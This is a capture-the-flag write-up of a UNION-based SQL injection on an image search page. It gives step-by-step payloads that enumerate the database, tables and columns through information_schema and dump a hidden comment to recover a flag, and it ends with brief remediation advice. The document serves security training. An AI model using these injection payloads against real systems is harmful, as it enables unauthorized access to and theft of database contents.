The vunerability is on the searchimg page
If you try 3, you'll get the result Google, but if you try 1 + 2, you'll get the same result, that mean we'll be able to exec SQL command

Next thing we want to know is the name of the database. To search another thing than the image search, we can use UNION.
With the usage of database(), we can get the name of the database, so we get the command:
25 UNION SELECT 1,database()
================================================================================================================================================================================================================
We used 25 because we're sure there is nothing as result for 25.
We get the result: Member_images


Now we want to know the name of the tables. We'll use information_schema.TABLES, to get those informations.
Also, we'll need to use CHAR() because the server doesn't accept Strings. The command is:
25 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)
================================================================================================================================================================================================================
And we get only one result: list_images


Next step is to know all the columns of that table, so we proceed the same way as before:
25 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115) AND TABLE_NAME = CHAR(108,105,115,116,095,105,109,097,103,101,115)
================================================================================================================================================================================================================
We get 4 columns: id, url, title and comment


For the final part, there is only the comment column that is not display with a normal search, so we'll look what's inside:
25 UNION SELECT id, comment FROM list_images
================================================================================================================================================================================================================
For the id of 5, we get "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"


if we decode 1928e8083cf461a51303633093573c46, we get albatroz, and if we use sha256 on it, we get the flag:
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

how to correct: - just DON'T and NEVER use something like: "SELECT  * FROM users WHERE id : '" + id_not_protected + "'"
                - there is several different ways to do it safely, like using mysql_real_escape_string(), or use the PDO (if supported)
